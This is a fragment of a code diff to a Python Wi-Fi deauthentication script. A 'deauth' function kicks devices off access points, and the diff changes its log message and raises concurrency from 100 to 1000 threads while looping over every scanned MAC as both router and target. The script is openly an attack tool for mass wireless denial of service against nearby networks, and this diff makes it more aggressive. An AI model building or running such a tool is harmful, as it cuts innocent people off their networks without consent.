@@ -4,7 +4,7 @@ import time
 import subprocess
 import re
 def deauth(target_mac, access_point_mac):
-    print("kicking off {} from {}".format(target_mac,access_point_mac))
+    print("deauth: router:{}, device:{}".format(access_point_mac,target_mac))
     interface = "en0"
     packet_count = 100
     interval = 0.1
@@ -35,7 +35,7 @@ def maccy():
     subprocess.run(disconnect_cmd, shell=True)
     for mac in set(mac_addresses):
         yield mac
-with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
+with concurrent.futures.ThreadPoolExecutor(max_workers=1000) as executor:
     for wifi in maccy():
         for device in maccy():
             try:
